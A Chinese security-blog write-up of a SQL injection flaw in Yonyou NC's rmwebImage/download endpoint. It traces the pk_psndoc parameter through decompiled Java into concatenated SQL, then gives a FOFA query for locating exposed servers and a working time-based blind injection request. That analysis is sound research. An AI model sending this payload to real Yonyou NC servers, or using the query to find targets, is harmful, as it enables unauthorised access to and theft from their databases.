---
title: "用友NC rmwebImage/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html
asset_dir: assets/用友nc-rmwebimagedownload-sql注入漏洞
---

# 用友NC rmwebImage/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/5 08:30
* 877浏览
* [0评论](#comment)
* 2小时阅读

深入探索

编程语言教程

数据库

JSON处理工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmwebImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。

代码安全审计

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

深入探索

Windows安全工具

漏洞预警服务

漏洞扫描服务

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 rmwebImage 接口

[![用友NC rmwebImage/download sql注入漏洞](images/img-001-eedb0e48cd2a.webp)](https://image.mrxn.net/249bfd8371ce4c7586f00c58726e6689.webp)

因此搜索 rmwebImage 方法的实现部分即可定位文件

漏洞修复方案

modules/hrss/lib/pubhrss\_pub/nc/bs/hrss/pub/action/RMWebImageAction.java

```
package nc.bs.hrss.pub.action;

import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGImageEncoder;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import javax.servlet.ServletOutputStream;
import javax.swing.ImageIcon;
import nc.bs.framework.common.RuntimeEnv;
import nc.bs.hrss.pub.ServiceLocator;
import nc.bs.hrss.pub.exception.HrssException;
import nc.bs.hrss.pub.tool.SessionUtil;
import nc.bs.logging.Logger;
import nc.itf.hi.IPsndocQryService;
import nc.itf.rm.IRMPsndocQueryService;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.bd.pub.SexEnum;
import nc.vo.hi.psndoc.PsndocAggVO;
import nc.vo.hr.tools.formconfig.CodeGenUtils;
import nc.vo.pub.BusinessException;
import nc.vo.rm.psndoc.AggRMPsndocVO;
import nc.vo.rm.psndoc.RMPsndocVO;
import org.apache.commons.io.IOUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(path="/rmwebImage")
public class RMWebImageAction
extends BaseAction {
    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Action
    public void download() {
        ServletOutputStream out = null;
        try {
            byte[] pngBytes = null;
            byte[] pngBytesNew = null;
            Object photo = null;
            FileInputStream fileInput = null;
            this.request.setCharacterEncoding("UTF-8");
            String pk_psndoc = this.request.getParameter("pk_psndoc");
            try {
                IRMPsndocQueryService psndocQryServ = ServiceLocator.lookup(IRMPsndocQueryService.class);
                AggRMPsndocVO aggRMPsndocVO = psndocQryServ.queryByPK(pk_psndoc);
                Object object = photo = aggRMPsndocVO == null ? null : ((RMPsndocVO)aggRMPsndocVO.getParentVO()).getPhoto();
                if (photo == null) {
                    String photoFileName = "photo_defult_male.png";
                    if (SessionUtil.getSessionBean() != null || aggRMPsndocVO != null) {
                        IPsndocQryService psndocQry;
                        PsndocAggVO psndocAggVO;
                        if (null != aggRMPsndocVO && null != aggRMPsndocVO.getParentVO() && null != aggRMPsndocVO.getPsndocVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == aggRMPsndocVO.getPsndocVO().getSex().intValue()) {
                            photoFileName = "photo_defult_female.png";
                        }
                        if (aggRMPsndocVO == null && null != (psndocAggVO = (psndocQry = ServiceLocator.lookup(IPsndocQryService.class)).queryPsndocVOByPk(SessionUtil.getPk_psndoc(), false, true)) && null != psndocAggVO.getParentVO() && null != psndocAggVO.getParentVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == psndocAggVO.getParentVO().getSex().intValue()) {
                            photoFileName = "photo_defult_female.png";
                        }
                    }
                    String strSrcDir = CodeGenUtils.buildFileURL((String)RuntimeEnv.getInstance().getNCHome(), (String[])new String[]{"hotwebs", "lfw", "frame", "device_pc", "themes", LfwRuntimeEnvironment.getThemeId(), "ext", "hrss", "pub", photoFileName});
                    File file = new File(strSrcDir);
                    fileInput = new FileInputStream(file);
                    pngBytes = new byte[fileInput.available()];
                    fileInput.read(pngBytes);
                } else {
                    pngBytes = (byte[])photo;
                }
                pngBytesNew = RMWebImageAction.transPreviewPhoto(pngBytes, 150, 118);
                this.response.setContentType("image/png");
                out = this.response.getOutputStream();
                out.write(pngBytesNew);
                out.flush();
            }
            catch (HrssException ex) {
                Logger.error((Object)ex.getMessage(), (Throwable)ex);
            }
            catch (BusinessException e) {
                new HrssException(e).alert();
            }
            finally {
                if (fileInput != null) {
                    fileInput.close();
                }
            }
        }
        catch (Exception e) {
            throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("c_pub-res", "0c_pub-res0051"), (Throwable)e);
        }
        finally {
            IOUtils.closeQuietly(out);
        }
    }
```

pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下

SQL注入防护

```
private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
    try {
        IRMPsndocQueryService psndocQryServ = (IRMPsndocQueryService)ServiceLocator.lookup(IRMPsndocQueryService.class);
        AggRMPsndocVO aggRMPsndocVO = psndocQryServ.queryByPK(pk_psndoc);
        return aggRMPsndocVO;
    } catch (BusinessException e) {
        (new HrssException(e)).deal();
    } catch (HrssException e) {
        (new HrssException(e)).alert();
    }

    return null;
}
```

继续代入psndocQryServ.queryByPK 函数，其实现逻辑如下

```
public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
    return (AggRMPsndocVO)this.getServiceTemplate().queryByPk(AggRMPsndocVO.class, pk_psndoc);
}
```

继续跟踪 getServiceTemplate().queryByPk 函数，这里注意 传入的第三个参数为 false

代码安全审计

```
public <T> T queryByPk(Class<T> clazz, String pk) throws BusinessException {
    return (T)this.queryByPk(clazz, pk, false);
}
public <T> T queryByPk(Class<T> clazz, String pk, boolean lazyLoad2) throws BusinessException {
    try {
        return (T)getMDQueryService().queryBillOfVOByPK(clazz, pk, lazyLoad2);
    } catch (MetaDataException e) {
        Logger.error(e.getMessage(), e);
        throw new BusinessException(ResHelper.getString("6001frame", "06001frame0153"), e);
    }
}
```

继续跟踪 getMDQueryService().queryBillOfVOByPK 函数

```
public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    return (T)(new MDBaseDAO()).queryBillOfVOByPK(voClass, billPK, bLazyLoad);
}
```

pk\_psndoc ==>pk ==>billPK 又代入 (new MDBaseDAO()).queryBillOfVOByPK 函数

```
public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject ncObj = (new VOQueryPersister(voClass.getName())).queryBillImp(billPK, bLazyLoad);
    if (ncObj == null) {
        return null;
    } else {
        return AggregatedValueObject.class.isAssignableFrom(voClass) ? ncObj.getContainmentObject() : ncObj.getModelConsistObject();
    }
}
```

billPK 继续代入 queryBillImp 函数

```
protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject resNCObj = null;

    try {
        Object resVO = this.dao.retrieveByPK(billPK, this.ignoreDrEqual1);
        if (resVO == null) {
            return null;
        } else {
            resNCObj = NCObject.newInstance(this.relatedEntity, resVO);
            if (!bLazyLoad) {
                this.queryChildrenVOSByParentObjs(new NCObject[]{resNCObj}, bLazyLoad, (Map)null, (String)null);
            }

            return resNCObj;
        }
    } catch (Exception e) {
        Logger.error("fail to query data", e);
        throw new MetaDataException("operation failed** baseDao.retrieveByPK," + e.getMessage());
    }
}
```

继续跟踪 retrieveByPK 函数

```
public Object retrieveByPK(String pkValue, boolean ignoreDrEqual1) throws MetaDataException {
    if (this.metaCollection != null && this.metaCollection.size() != 0) {
        String whereConStr = "";
        whereConStr = (String)this.tableAliasMap.get(this.bean.getTable().getName()) + "." + this.bean.getTable().getPrimaryKeyName() + "='" + pkValue + "'";
        if (ignoreDrEqual1) {
            whereConStr = whereConStr + " and isnull(" + this.bean.getTable().getName() + ".dr,0)=0 ";
        }

        List<E> beanList = this.retrieveByClouse(whereConStr, (String[])null, false);
        return beanList != null && beanList.size() > 0 ? beanList.get(0) : null;
    } else {
        return null;
    }
}

public List<E> retrieveByClouse(String whereCondStr, String[] filtAttrNames, boolean ignoreDrEqual1) throws MetaDataException {
    String resultSql = this.generateSql(whereCondStr, filtAttrNames, (String)null, (String)null, ignoreDrEqual1);
    List<E> beanList = null;

    try {
        beanList = (List)(new BaseDAO()).executeQuery(resultSql, new BeanListFromColumnLableProcessor(Class.forName(this.bean.getFullClassName()), this.bean));
        return beanList;
    } catch (Exception e) {
        throw new MetaDataException(NCLangResOnserver.getInstance().getStrByID("mdbusi", "mdMultiTableDAO-0001") + resultSql + "####type:" + this.bean.getName() + "#$#$#" + e.getMessage(), e);
    }
}
```

至此，最终 pk\_psndoc 参数拼接进SQL语句里，ignoreDrEqual1 在前面已经定义传入的为 false ，而 generateSql 函数的作用是组装SQL语句

编程

[![用友NC rmwebImage/download sql注入漏洞](images/img-002-e9e9638bcfbc.webp)](https://image.mrxn.net/b3e397c997d748928687a42f4caf1ac0.webp)

最终调用 (new BaseDAO()).executeQuery 执行上面组合后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过如下请求来确定目标是否存在此接口及其响应，如果存在此模块，则会响应一个图片内容

```
GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1 HTTP/1.1
Host: nc65.mrxn.net
```

漏洞利用示例

漏洞修复方案

```
GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- HTTP/1.1
HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC rmwebImage/download sql注入漏洞](images/img-003-88395734dea4.webp)](https://image.mrxn.net/a02e453c7e9a49608b7b2e54f71e71d9.webp)

成功延时 5 秒

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=676`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC rmwebImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk\_psndoc-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
